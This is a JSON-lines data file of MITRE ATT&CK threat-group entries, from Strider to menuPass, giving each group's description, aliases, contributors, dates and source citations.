{"ID":"G0041","name":"Strider","description":"[Strider](https://attack.mitre.org/groups/G0041) is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.(Citation: Symantec Strider Blog)(Citation: Kaspersky ProjectSauron Blog)","url":"https://attack.mitre.org/groups/G0041","created":"31 May 2017","last modified":"29 June 2020","version":"1.1","contributors":null,"associated groups":"ProjectSauron","associated groups citations":"ProjectSauron is used to refer both to the threat group also known as G0041 as well as the malware platform also known as S0125. (Citation: Kaspersky ProjectSauron Blog) (Citation: Kaspersky ProjectSauron Full Report)","relationship citations":"(Citation: Symantec Strider Blog),(Citation: Kaspersky ProjectSauron Blog),(Citation: Kaspersky ProjectSauron Blog),(Citation: Kaspersky ProjectSauron Full Report),"}
{"ID":"G0039","name":"Suckfly","description":"[Suckfly](https://attack.mitre.org/groups/G0039) is a China-based threat group that has been active since at least 2014. (Citation: Symantec Suckfly March 2016)","url":"https://attack.mitre.org/groups/G0039","created":"31 May 2017","last modified":"15 April 2022","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Symantec Suckfly May 2016),(Citation: Symantec Suckfly March 2016),(Citation: Symantec Suckfly May 2016),(Citation: Symantec Suckfly March 2016),"}
{"ID":"G0062","name":"TA459","description":"[TA459](https://attack.mitre.org/groups/G0062) is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. (Citation: Proofpoint TA459 April 2017)","url":"https://attack.mitre.org/groups/G0062","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":"Valerii Marchuk, Cybersecurity Help s.r.o.","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Proofpoint TA459 April 2017),(Citation: Proofpoint TA459 April 2017),"}
{"ID":"G0092","name":"TA505","description":"[TA505](https://attack.mitre.org/groups/G0092) is a cyber criminal group that has been active since at least 2014. [TA505](https://attack.mitre.org/groups/G0092) is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving [Clop](https://attack.mitre.org/software/S0611).(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: NCC Group TA505)(Citation: Korean FSI TA505 2020)","url":"https://attack.mitre.org/groups/G0092","created":"28 May 2019","last modified":"22 March 2023","version":"2.1","contributors":null,"associated groups":"Hive0065","associated groups citations":"(Citation: IBM TA505 April 2020)","relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Proofpoint TA505 June 2018),(Citation: Unit42 Clop April 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro TA505 June 2019),(Citation: Korean FSI TA505 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Cybereason TA505 April 2019),(Citation: IBM TA505 April 2020),(Citation: NCC Group TA505),(Citation: Cybereason Clop Dec 2020),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Proofpoint TA505 Sep 2017),(Citation: Proofpoint TA505 June 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro TA505 June 2019),(Citation: Korean FSI TA505 2020),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro TA505 Aug 2019),(Citation: Cybereason TA505 April 2019),(Citation: IBM TA505 April 2020),(Citation: NCC Group TA505),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Proofpoint TA505 Sep 2017),"}
{"ID":"G0127","name":"TA551","description":"[TA551](https://attack.mitre.org/groups/G0127) is a financially-motivated threat group that has been active since at least 2018. (Citation: Secureworks GOLD CABIN) The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. (Citation: Unit 42 TA551 Jan 2021)","url":"https://attack.mitre.org/groups/G0127","created":"19 March 2021","last modified":"22 March 2023","version":"1.2","contributors":"Ryo Tamura, SecureBrain Corporation; Shotaro Hamamoto, NEC Solution Innovators, Ltd; Shuhei Sasada, Cyber Defense Institute, Inc; Takuma Matsumoto, LAC Co., Ltd; Yusuke Niwa, ITOCHU Corporation","associated groups":"GOLD CABIN, Shathak","associated groups citations":"(Citation: Secureworks GOLD CABIN), (Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)","relationship citations":"(Citation: Unit 42 TA551 Jan 2021),(Citation: ATT QakBot April 2021),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Valak May 2020),(Citation: Secureworks GOLD CABIN),(Citation: Unit 42 TA551 Jan 2021),(Citation: Unit 42 Valak July 2020),(Citation: Secureworks GOLD CABIN),"}
{"ID":"G0088","name":"TEMP.Veles","description":"[TEMP.Veles](https://attack.mitre.org/groups/G0088) is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing [TRITON](https://attack.mitre.org/software/S0609), a malware framework designed to manipulate industrial safety systems.(Citation: FireEye TRITON 2019)(Citation: FireEye TEMP.Veles 2018)(Citation: FireEye TEMP.Veles JSON April 2019)","url":"https://attack.mitre.org/groups/G0088","created":"16 April 2019","last modified":"30 November 2022","version":"1.3","contributors":"Dragos  Threat  Intelligence","associated groups":"XENOTIME","associated groups citations":"The activity group XENOTIME, as defined by Dragos, has overlaps with activity reported upon by FireEye about TEMP.Veles as well as the actors behind [TRITON](https://attack.mitre.org/software/S0609).(Citation: Dragos Xenotime 2018)(Citation: Pylos Xenotime 2019)(Citation: FireEye TRITON 2019)(Citation: FireEye TEMP.Veles 2018)","relationship citations":"(Citation: FireEye TRITON 2019),(Citation: Dragos Xenotime 2018),(Citation: FireEye TRITON 2019),(Citation: FireEye TEMP.Veles 2018),"}
{"ID":"G0139","name":"TeamTNT","description":"[TeamTNT](https://attack.mitre.org/groups/G0139) is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging cloud and container resources to deploy cryptocurrency miners in victim environments.(Citation: Palo Alto Black-T October 2020)(Citation: Lacework TeamTNT May 2021)(Citation: Intezer TeamTNT September 2020)(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro TeamTNT)(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Aqua TeamTNT August 2020)(Citation: Intezer TeamTNT Explosion September 2021)","url":"https://attack.mitre.org/groups/G0139","created":"01 October 2021","last modified":"19 October 2022","version":"1.2","contributors":"Darin Smith, Cisco; Will Thomas, Cyjax","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Palo Alto Black-T October 2020),(Citation: TeamTNT Cloud Enumeration),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Aqua TeamTNT August 2020),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Palo Alto Black-T October 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Unit 42 Hildegard Malware),(Citation: Lacework TeamTNT May 2021),(Citation: Talos TeamTNT),(Citation: Intezer TeamTNT September 2020),(Citation: Trend Micro TeamTNT),"}
{"ID":"G0089","name":"The White Company","description":"[The White Company](https://attack.mitre.org/groups/G0089) is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.(Citation: Cylance Shaheen Nov 2018)","url":"https://attack.mitre.org/groups/G0089","created":"02 May 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Cylance Shaheen Nov 2018),(Citation: Cylance Shaheen Nov 2018),"}
{"ID":"G0028","name":"Threat Group-1314","description":"[Threat Group-1314](https://attack.mitre.org/groups/G0028) is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. (Citation: Dell TG-1314)","url":"https://attack.mitre.org/groups/G0028","created":"31 May 2017","last modified":"19 March 2020","version":"1.1","contributors":null,"associated groups":"TG-1314","associated groups citations":"(Citation: Dell TG-1314)","relationship citations":"(Citation: Dell TG-1314),(Citation: Dell TG-1314),"}
{"ID":"G0027","name":"Threat Group-3390","description":"[Threat Group-3390](https://attack.mitre.org/groups/G0027) is a Chinese threat group that has extensively used strategic Web compromises to target victims.(Citation: Dell TG-3390) The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Securelist LuckyMouse June 2018)(Citation: Trend Micro DRBControl February 2020)","url":"https://attack.mitre.org/groups/G0027","created":"31 May 2017","last modified":"29 March 2023","version":"2.1","contributors":"Daniyal Naeem, BT Security; Kyaw Pyiyt Htet, @KyawPyiytHtet","associated groups":"APT27, BRONZE UNION, Earth Smilodon, Emissary Panda, Iron Tiger, LuckyMouse, TG-3390","associated groups citations":"(Citation: Nccgroup Emissary Panda May 2018)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro Iron Tiger April 2021), (Citation: SecureWorks BRONZE UNION June 2017)(Citation: Nccgroup Emissary Panda May 2018), (Citation: Trend Micro Iron Tiger April 2021), (Citation: Gallagher 2015)(Citation: Nccgroup Emissary Panda May 2018)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Unit42 Emissary Panda May 2019)(Citation: Trend Micro Iron Tiger April 2021), (Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro Iron Tiger April 2021), (Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro Iron Tiger April 2021), (Citation: Dell TG-3390)(Citation: Nccgroup Emissary Panda May 2018)(Citation: Hacker News LuckyMouse June 2018)","relationship citations":"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Securelist LuckyMouse June 2018),(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Hacker News LuckyMouse June 2018),(Citation: Profero APT27 December 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Talent-Jump Clambling February 2020),(Citation: Dell TG-3390),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Securelist LuckyMouse June 2018),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Gallagher 2015),(Citation: Hacker News LuckyMouse June 2018),(Citation: Unit42 Emissary Panda May 2019),(Citation: Profero APT27 December 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: Dell TG-3390),"}
{"ID":"G0076","name":"Thrip","description":"[Thrip](https://attack.mitre.org/groups/G0076) is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living off the land\" techniques. (Citation: Symantec Thrip June 2018)","url":"https://attack.mitre.org/groups/G0076","created":"17 October 2018","last modified":"12 October 2021","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Symantec Thrip June 2018),(Citation: Symantec Thrip June 2018),"}
{"ID":"G0131","name":"Tonto Team","description":"[Tonto Team](https://attack.mitre.org/groups/G0131) is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they expanded operations to include other Asian as well as Eastern European countries. [Tonto Team](https://attack.mitre.org/groups/G0131) has targeted government, military, energy, mining, financial, education, healthcare, and technology organizations, including through the Heartbeat Campaign (2009-2012) and Operation Bitter Biscuit (2017).(Citation: Kaspersky CactusPete Aug 2020)(Citation: ESET Exchange Mar 2021)(Citation: FireEye Chinese Espionage October 2019)(Citation: ARS Technica China Hack SK April 2017)(Citation: Trend Micro HeartBeat Campaign January 2013)(Citation: Talos Bisonal 10 Years March 2020)","url":"https://attack.mitre.org/groups/G0131","created":"05 May 2021","last modified":"27 January 2022","version":"1.1","contributors":null,"associated groups":"BRONZE HUNTLEY, CactusPete, Earth Akhlut, Karma Panda","associated groups citations":"(Citation: Secureworks BRONZE HUNTLEY ), (Citation: Kaspersky CactusPete Aug 2020), (Citation: TrendMicro Tonto Team October 2020), (Citation: Kaspersky CactusPete Aug 2020)(Citation: CrowdStrike Manufacturing Threat July 2020)","relationship citations":"(Citation: Kaspersky CactusPete Aug 2020),(Citation: Secureworks BRONZE HUNTLEY ),(Citation: TrendMicro Tonto Team October 2020),(Citation: Talos Bisonal Mar 2020),(Citation: ESET Exchange Mar 2021),(Citation: TrendMicro Tonto Team October 2020),(Citation: Talos Bisonal 10 Years March 2020),(Citation: Talos Bisonal Mar 2020),(Citation: Kaspersky CactusPete Aug 2020),"}
{"ID":"G0134","name":"Transparent Tribe","description":"[Transparent Tribe](https://attack.mitre.org/groups/G0134) is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Transparent Tribe May 2021)","url":"https://attack.mitre.org/groups/G0134","created":"02 September 2021","last modified":"22 September 2022","version":"1.1","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":"APT36, COPPER FIELDSTONE, Mythic Leopard, ProjectM","associated groups citations":"(Citation: Talos Transparent Tribe May 2021), (Citation: Secureworks COPPER FIELDSTONE Profile), (Citation: Crowdstrike Mythic Leopard Profile)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Transparent Tribe May 2021), (Citation: Unit 42 ProjectM March 2016)(Citation: Kaspersky Transparent Tribe August 2020)","relationship citations":"(Citation: Unit 42 ProjectM March 2016),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Talos Oblique RAT March 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Talos Transparent Tribe May 2021),(Citation: Talos Oblique RAT March 2021),(Citation: Unit 42 ProjectM March 2016),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"}
{"ID":"G0081","name":"Tropic Trooper","description":"[Tropic Trooper](https://attack.mitre.org/groups/G0081) is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. [Tropic Trooper](https://attack.mitre.org/groups/G0081) focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper May 2020)","url":"https://attack.mitre.org/groups/G0081","created":"29 January 2019","last modified":"26 April 2021","version":"1.4","contributors":"Bart Parys; Edward Millington","associated groups":"KeyBoy, Pirate Panda","associated groups citations":"(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper Mar 2018), (Citation: Crowdstrike Pirate Panda April 2020)","relationship citations":"(Citation: TrendMicro TropicTrooper 2015),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Recorded Future RedEcho Feb 2021),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: CitizenLab Tropic Trooper Aug 2018),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: TrendMicro TropicTrooper 2015),(Citation: Anomali Pirate Panda April 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: CitizenLab Tropic Trooper Aug 2018),(Citation: PWC KeyBoys Feb 2017),"}
{"ID":"G0010","name":"Turla","description":"[Turla](https://attack.mitre.org/groups/G0010) is a Russian-based threat group that has infected victims in over 45 countries, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies since 2004. Heightened activity was seen in mid-2015. [Turla](https://attack.mitre.org/groups/G0010) is known for conducting watering hole and spearphishing campaigns and leveraging in-house tools and malware. [Turla](https://attack.mitre.org/groups/G0010)’s espionage platform is mainly used against Windows machines, but has also been seen used against macOS and Linux machines.(Citation: Kaspersky Turla)(Citation: ESET Gazer Aug 2017)(Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla Mosquito Jan 2018)","url":"https://attack.mitre.org/groups/G0010","created":"31 May 2017","last modified":"22 March 2023","version":"3.1","contributors":"Edward Millington; Matthieu Faou, ESET","associated groups":"Belugasturgeon, Group 88, IRON HUNTER, Krypton, Snake, Venomous Bear, Waterbug, WhiteBear","associated groups citations":"(Citation: Accenture HyperStack October 2020), (Citation: Leonardo Turla Penquin May 2020), (Citation: Secureworks IRON HUNTER Profile), (Citation: CrowdStrike VENOMOUS BEAR), (Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla PowerShell May 2019)(Citation: Talos TinyTurla September 2021), (Citation: CrowdStrike VENOMOUS BEAR)(Citation: Talos TinyTurla September 2021), Based similarity in TTPs and malware used, Turla and Waterbug appear to be the same group.(Citation: Symantec Waterbug), WhiteBear is a designation used by Securelist to describe a cluster of activity that has overlaps with activity described by others as Turla, but appears to have a separate focus.(Citation: Securelist WhiteBear Aug 2017)(Citation: Talos TinyTurla September 2021)","relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: ESET Turla August 2018),(Citation: Kaspersky Turla),(Citation: Talos TinyTurla September 2021),(Citation: ESET Crutch December 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Symantec Waterbug Jun 2019),(Citation: Leonardo Turla Penquin May 2020),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET Carbon Mar 2017),(Citation: Secureworks IRON HUNTER Profile),(Citation: ESET LightNeuron May 2019),(Citation: ESET Turla Mosquito May 2018),(Citation: Symantec Waterbug),(Citation: ESET Gazer Aug 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Accenture HyperStack October 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Kaspersky Turla),(Citation: Talos TinyTurla September 2021),(Citation: ESET Crutch December 2020),(Citation: Unit42 AcidBox June 2020),(Citation: GitHub Turla Driver Loader),(Citation: Symantec Waterbug Jun 2019),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET ComRAT May 2020),(Citation: Secureworks IRON HUNTER Profile),(Citation: Recorded Future Turla Infra 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ESET Turla Mosquito May 2018),(Citation: NSA NCSC Turla OilRig),(Citation: Github Rapid7 Meterpreter Elevate),(Citation: ESET Gazer Aug 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Accenture HyperStack October 2020),"}
{"ID":"G0123","name":"Volatile Cedar","description":"[Volatile Cedar](https://attack.mitre.org/groups/G0123) is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. [Volatile Cedar](https://attack.mitre.org/groups/G0123) has been operating since 2012 and is motivated by political and ideological interests.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)","url":"https://attack.mitre.org/groups/G0123","created":"08 February 2021","last modified":"20 April 2022","version":"1.1","contributors":null,"associated groups":"Lebanese Cedar","associated groups citations":"(Citation: ClearSky Lebanese Cedar Jan 2021)","relationship citations":"(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ClearSky Lebanese Cedar Jan 2021),"}
{"ID":"G0090","name":"WIRTE","description":"[WIRTE](https://attack.mitre.org/groups/G0090) is a threat group that has been active since at least August 2018. [WIRTE](https://attack.mitre.org/groups/G0090) has targeted government, diplomatic, financial, military, legal, and technology organizations in the Middle East and Europe.(Citation: Lab52 WIRTE Apr 2019)(Citation: Kaspersky WIRTE November 2021)","url":"https://attack.mitre.org/groups/G0090","created":"24 May 2019","last modified":"15 April 2022","version":"2.0","contributors":"Lab52 by S2 Grupo","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Kaspersky WIRTE November 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: Lab52 WIRTE Apr 2019),"}
{"ID":"G0107","name":"Whitefly","description":"[Whitefly](https://attack.mitre.org/groups/G0107) is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore’s largest public health organization, SingHealth.(Citation: Symantec Whitefly March 2019)","url":"https://attack.mitre.org/groups/G0107","created":"26 May 2020","last modified":"12 October 2021","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Symantec Whitefly March 2019),(Citation: Symantec Whitefly March 2019),"}
{"ID":"G0124","name":"Windigo","description":"The [Windigo](https://attack.mitre.org/groups/G0124) group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the [Ebury](https://attack.mitre.org/software/S0377) SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, [Windigo](https://attack.mitre.org/groups/G0124) operators continued updating [Ebury](https://attack.mitre.org/software/S0377) through 2019.(Citation: ESET Windigo Mar 2014)(Citation: CERN Windigo June 2019)","url":"https://attack.mitre.org/groups/G0124","created":"10 February 2021","last modified":"26 April 2021","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: ESET Ebury Oct 2017),(Citation: ESET ForSSHe December 2018),(Citation: ESET Windigo Mar 2014),"}
{"ID":"G0112","name":"Windshift","description":"[Windshift](https://attack.mitre.org/groups/G0112) is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)","url":"https://attack.mitre.org/groups/G0112","created":"25 June 2020","last modified":"26 April 2021","version":"1.1","contributors":null,"associated groups":"Bahamut","associated groups citations":"(Citation: SANS Windshift August 2018)","relationship citations":"(Citation: SANS Windshift August 2018),(Citation: objective-see windtail2 jan 2019),(Citation: objective-see windtail1 dec 2018),(Citation: BlackBerry Bahamut),(Citation: SANS Windshift August 2018),(Citation: objective-see windtail1 dec 2018),"}
{"ID":"G0044","name":"Winnti Group","description":"[Winnti Group](https://attack.mitre.org/groups/G0044) is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting.(Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015)(Citation: Novetta Winnti April 2015) Some reporting suggests a number of other groups, including [Axiom](https://attack.mitre.org/groups/G0001), [APT17](https://attack.mitre.org/groups/G0025), and [Ke3chang](https://attack.mitre.org/groups/G0004), are closely linked to [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: 401 TRG Winnti Umbrella May 2018)","url":"https://attack.mitre.org/groups/G0044","created":"31 May 2017","last modified":"20 March 2023","version":"1.2","contributors":"Edward Millington","associated groups":"Blackfly","associated groups citations":"(Citation: Symantec Suckfly March 2016)","relationship citations":"(Citation: ESET PipeMon May 2020),(Citation: Kaspersky Winnti April 2013),(Citation: Kaspersky Winnti June 2015),(Citation: Kaspersky Winnti April 2013),"}
{"ID":"G0102","name":"Wizard Spider","description":"[Wizard Spider](https://attack.mitre.org/groups/G0102) is a Russia-based financially motivated threat group originally known for the creation and deployment of [TrickBot](https://attack.mitre.org/software/S0266) since at least 2016. [Wizard Spider](https://attack.mitre.org/groups/G0102) possesses a diverse arsenal of tools and has conducted ransomware campaigns against a variety of organizations, ranging from major corporations to hospitals.(Citation: CrowdStrike Ryuk January 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: CrowdStrike Wizard Spider October 2020)","url":"https://attack.mitre.org/groups/G0102","created":"12 May 2020","last modified":"22 March 2023","version":"2.1","contributors":"Edward Millington; Oleksiy Gayda","associated groups":"Grim Spider, TEMP.MixMaster, UNC1878","associated groups citations":"(Citation: CrowdStrike Ryuk January 2019)(Citation: CrowdStrike Grim Spider May 2019), (Citation: FireEye Ryuk and Trickbot January 2019), (Citation: FireEye KEGTAP SINGLEMALT October 2020)","relationship citations":"(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: CrowdStrike Wizard Spider March 2019),(Citation: Sophos New Ryuk Attack October 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Forbes Dyre May 2017),(Citation: Malwarebytes TrickBot Sep 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: CrowdStrike Ryuk January 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Group IB GrimAgent July 2021),(Citation: DFIR Ryuk's Return October 2020),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Sophos New Ryuk Attack October 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: CrowdStrike Grim Spider May 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: DFIR Ryuk's Return October 2020),"}
{"ID":"G0128","name":"ZIRCONIUM","description":"[ZIRCONIUM](https://attack.mitre.org/groups/G0128) is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community.(Citation: Microsoft Targeting Elections September 2020)(Citation: Check Point APT31 February 2021)","url":"https://attack.mitre.org/groups/G0128","created":"24 March 2021","last modified":"22 March 2023","version":"1.1","contributors":null,"associated groups":"APT31","associated groups citations":"(Citation: Check Point APT31 February 2021)","relationship citations":",(Citation: Check Point APT31 February 2021),(Citation: Google Election Threats October 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Microsoft Targeting Elections September 2020),"}
{"ID":"G0018","name":"admin@338","description":"[admin@338](https://attack.mitre.org/groups/G0018) is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as [PoisonIvy](https://attack.mitre.org/software/S0012), as well as some non-public backdoors. (Citation: FireEye admin@338)","url":"https://attack.mitre.org/groups/G0018","created":"31 May 2017","last modified":"18 March 2020","version":"1.2","contributors":"Tatsuya Daitoku, Cyber Defense Institute, Inc.","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: FireEye admin@338),(Citation: FireEye admin@338),"}
{"ID":"G0045","name":"menuPass","description":"[menuPass](https://attack.mitre.org/groups/G0045) is a threat group that has been active since at least 2006. Individual members of [menuPass](https://attack.mitre.org/groups/G0045) are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company.(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)\n\n[menuPass](https://attack.mitre.org/groups/G0045) has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university.(Citation: Palo Alto menuPass Feb 2017)(Citation: Crowdstrike CrowdCast Oct 2013)(Citation: FireEye Poison Ivy)(Citation: PWC Cloud Hopper April 2017)(Citation: FireEye APT10 April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)","url":"https://attack.mitre.org/groups/G0045","created":"31 May 2017","last modified":"23 March 2023","version":"2.1","contributors":"Edward Millington; Michael Cox","associated groups":"APT10, CVNX, Cicada, HOGFISH, POTASSIUM, Red Apollo, Stone Panda","associated groups citations":"(Citation: Palo Alto menuPass Feb 2017)(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018)(Citation: DOJ APT10 Dec 2018)(Citation: Symantec Cicada November 2020), (Citation: PWC Cloud Hopper April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018), (Citation: Symantec Cicada November 2020), (Citation: Accenture Hogfish April 2018), (Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018), (Citation: PWC Cloud Hopper April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018), (Citation: Palo Alto menuPass Feb 2017)(Citation: Accenture Hogfish April 2018)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)(Citation: Symantec Cicada November 2020)","relationship citations":"(Citation: FireEye APT10 Sept 2018),(Citation: Accenture Hogfish April 2018),(Citation: Securelist APT10 March 2021),(Citation: FireEye APT10 April 2017),(Citation: DOJ APT10 Dec 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Symantec Cicada November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Github AD-Pentest-Script),(Citation: Accenture Hogfish April 2018),(Citation: Securelist APT10 March 2021),(Citation: FireEye APT10 April 2017),(Citation: DOJ APT10 Dec 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: PWC Cloud Hopper April 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Symantec Cicada November 2020),"}
